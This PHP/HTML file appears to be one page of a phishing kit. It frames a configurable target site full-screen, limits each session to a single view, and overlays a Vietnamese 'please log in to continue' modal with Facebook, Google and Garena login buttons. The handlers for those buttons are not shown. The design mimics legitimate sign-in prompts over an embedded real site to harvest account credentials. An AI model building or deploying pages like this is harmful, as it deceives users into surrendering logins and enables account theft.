<?php
include('config.php');
if(!isset($_SESSION['login'])){
    die('You can not access this page');
}

$_SESSION['check']+=1;

if($_SESSION['check'] >= 2){
    die('You can not access this page');
}
?>


<!DOCTYPE html>
<html style="background-color: black;">
<head>
    <meta content='width=device-width, initial-scale=1' name='viewport'/>
    <title><?=$query['tieude'];?></title>
    <meta name="description" content="<?=$query['mota'];?>"/>
    <link rel="icon" href="<?=$query['avatarweb'];?>" type="image/x-icon" />
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }

        .fullpage {
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .iframe-container {
            width: 100%;
            height: 100%;
        }

        .iframe-container iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 9999;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%; 
            height: auto;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.5);
        }

        .modal-content {
            background-color: #fefefe;
            margin: 0 auto;
            padding: 20px;
            max-width: 100%;
        }

        body {
            font-family: 'Roboto', sans-serif;
        }

        .modal-open {
            overflow: hidden;
        }

        .no-interaction {
            pointer-events: none;
        }

        .image-grid img {
            width: 75px;
            height: 75px;
        }

        .image-grid img {
            width: 75px;
            margin-right: 25px;
            height: 75px;
        }

        button {
            padding: 0;
            border: none;
            background: 0;
        }
       
        form {
            display: initial;
        }

 
    </style>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
</head>
<body>
    <div class="fullpage">
        <div class="iframe-container">
            <iframe id="CrossDomainiframeId" src="<?=$query123['urltwo'];?>"></iframe>
        </div>
    </div>
    
    <div id="myModal" class="modal">
        <div class="modal-content">
            <center>Vui lòng đăng nhập để tiếp tục:</center>
            <div class="image-grid" style="margin-top:20px">
                <center>
                    <?php
                    if($query['fb'] == 'on'){
                        echo '<button onclick="fb()" type="submit"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png"></button>  ';
                    }
                    if($query['gg'] == 'on'){
                        echo '<button onclick="gg()"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/2008px-Google_%22G%22_Logo.svg.png"></button> ';
                    }
                    if($query['gr'] == 'on'){
                        echo '<button onclick="garan()"><img src="https://logospng.org/download/garena/logo-escudo-garena-256.png"></button>      ';
                    }
                    ?>
                </center>
            </div>
        </div>
    </div>
   
   
</body>
</html>
